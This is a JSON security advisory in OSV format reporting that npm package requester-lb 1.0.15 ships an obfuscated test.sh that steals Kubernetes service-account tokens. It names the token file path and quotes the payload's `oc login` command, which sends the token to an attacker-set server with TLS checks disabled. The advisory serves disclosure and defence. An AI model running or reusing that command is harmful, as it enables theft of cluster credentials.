@@ -1,0 +1,70 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-11-20T01:07:58Z",
+  "modified": "2026-11-20T01:07:58Z",
+  "summary": "requester-lb ships obfuscated shell payload that exfiltrates Kubernetes service-account tokens via oc login to an attacker-chosen server",
+  "details": "The package advertises itself as an HTTP/DNS requester CLI but ships a test.sh whose primary purpose is credential theft. test.sh splits sensitive commands into ~10 single-letter shell variables that are concatenated and passed to eval, reconstructing `printenv` and a command that reads the in-pod Kubernetes service-account token from /var/run/secrets/kubernetes.io/serviceaccount/token into $DEBUG_FILE, then invokes `./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify` to authenticate the current cluster identity to a server specified via the SERV environment variable. The string-fragment obfuscation has no benign purpose and is a deliberate scanner-evasion pattern. The package layout corroborates the disguise: package.json declares `main: index.js` but no index.js is shipped, the only legitimate JS (requester.js) is unrelated to the shell payload, and test.sh is not referenced by any npm script — it is a standalone delivery vehicle for an operator or CI job that executes it inside a Kubernetes/OpenShift pod. The payload does not auto-execute on `npm install` (no lifecycle hook invokes test.sh), but the harm on explicit execution is cluster credential theft and attacker-controlled cluster federation with TLS verification disabled.",
+  "affected": [
+    {
+      "package": {
+        "name": "requester-lb",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.0.15"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "test.sh",
+              "sha256": "46780670f694f3ea7d2e61303b824c4900d977e5361ab611a768bc775038bba9",
+              "tlsh": "ec513e73305aa036118e833afbd074c5b720794b093e6c6cb8a6d1a92f363ed317d249"
+            },
+            {
+              "path": "package.json",
+              "sha256": "2d35bcaa9d8f78998b1c2ba9c13a6531f4c9d63e3ce68cbcfe0c5e6f2bd84d14",
+              "tlsh": "93d01275ccb5da7318ce3a760db97742e161bd2b6208ac1e53c3206986de67305fa24e"
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/requester-lb/v/1.0.15"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-022908",
+        "import_time": "2026-11-20T01:12:26.682350915Z",
+        "modified_time": "2026-11-20T01:07:58Z",
+        "sha256": "c60d261aea571490eb232b48a7451d083da0360292fc650ef1edbc19e66d4f30",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.15"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
